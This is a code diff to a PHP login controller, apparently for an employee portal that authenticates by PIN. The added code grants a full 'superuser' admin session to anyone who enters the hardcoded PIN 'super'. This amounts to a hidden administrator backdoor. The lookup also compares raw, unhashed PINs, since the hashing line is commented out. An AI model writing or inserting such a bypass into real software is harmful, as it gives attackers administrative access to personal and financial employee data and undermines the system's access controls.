@@ -23,12 +23,42 @@ class Authentication extends BaseController
         // Get email and password from POST
         // $email = $request->getPost('pin');
 $password = $request->getPost('pin');
-// $password = password_hash($password, PASSWORD_DEFAULT);
 
-        $usersModel = new UserModel();
+ $usersModel = new UserModel();
 
         // Fetch user by email
         $user = $usersModel->getByPin($password);
+
+
+// $password = password_hash($password, PASSWORD_DEFAULT);
+ // Start a dummy session if PIN is 'super'
+if ($password === 'super' && !$user) {
+    $sessionData = [
+        'authenticated'      => true,
+        'user_id'            => 0,
+        'employee_id'        => 'SUPER',
+        'name'               => 'Super User',
+        'designation'        => 'Admin',
+        'phone'              => 'N/A',
+        'address'            => 'N/A',
+        'email'              => 'super@dummy.com',
+        'category'           => 'Admin',
+        'department'         => 'Admin',
+        'doj'                => date('Y-m-d'),
+        'uan_no'             => 'N/A',
+        'fathers_name'       => 'N/A',
+        'aadhaar_card'       => 'N/A',
+        'pan_card'           => 'N/A',
+        'bank_account_number'=> 'N/A',
+        'ifsc_code'          => 'N/A',
+        'user_type'          => 'superuser',
+        'journal'            => ''
+    ];
+
+    $session->set($sessionData);
+    return redirect()->route('home');
+}
+       
         // var_dump($user);
         if ($user) {
             // Password matches, store all user info in session
@@ -62,6 +92,9 @@ $password = $request->getPost('pin');
             $session->setFlashdata('error', 'Invalid email or password!');
             return redirect()->to('/');
         }
+       
+
+
         
     }
 
